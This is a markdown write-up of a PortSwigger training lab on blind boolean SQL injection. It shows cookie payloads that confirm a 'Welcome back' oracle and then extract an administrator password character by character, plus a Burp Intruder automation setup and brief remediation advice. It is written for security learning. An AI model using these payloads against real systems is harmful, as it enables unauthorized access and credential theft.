# Lab 11 — Blind SQL injection with conditional responses

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Blind SQLi |
| **Concept** | [09 — Blind SQL injection](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses |

---

## 🎯 Objective
The `TrackingId` cookie is used in a query whose results aren't shown — but the page prints **"Welcome back"** when the query returns rows. Use this boolean oracle to extract the `administrator` password and **log in**.

## 🧠 Background
No data or errors are reflected, but one bit leaks: *"Welcome back" present = query returned a row (TRUE)*. Engine is **PostgreSQL**. Build a boolean oracle and binary-search the password.

## 🪜 Methodology
1. **Confirm the oracle** (edit the `TrackingId` cookie in Burp):
   ```sql
   TrackingId=xyz' AND '1'='1     → "Welcome back" appears  (TRUE)
   TrackingId=xyz' AND '1'='2     → message gone            (FALSE)
   ```
2. **Confirm the users table / admin row exists**:
   ```sql
   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
   ```
   "Welcome back" → the row exists.
3. **Find the password length** (increase N until FALSE):
   ```sql
   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
   ...
   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a  → FALSE
   ```
   → length is **20**.
4. **Extract each character** with a boolean test:
   ```sql
   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
   ```
   Iterate position 1..20 over `a-z 0-9`.

## 💥 Automating with Burp Intruder
- Send the request to **Intruder**, mark the character (`§a§`) and position with **Cluster bomb**.
- Payload set 1: positions `1..20`; set 2: charset `a-z0-9`.
- **Grep-Match** on `Welcome back` to flag TRUE hits → read the password off the results grid.

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

## ✅ Why it works
Each request asks one yes/no question about the password. The "Welcome back" string is the answer channel. Enough questions reconstruct the full secret — no visible output required.

## 🛡️ Remediation
Parameterize the tracking query; don't branch visible content on raw query results. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
A single boolean tell is enough to dump a password, one char at a time. `#sqli` `#practitioner` `#blind` `#boolean`
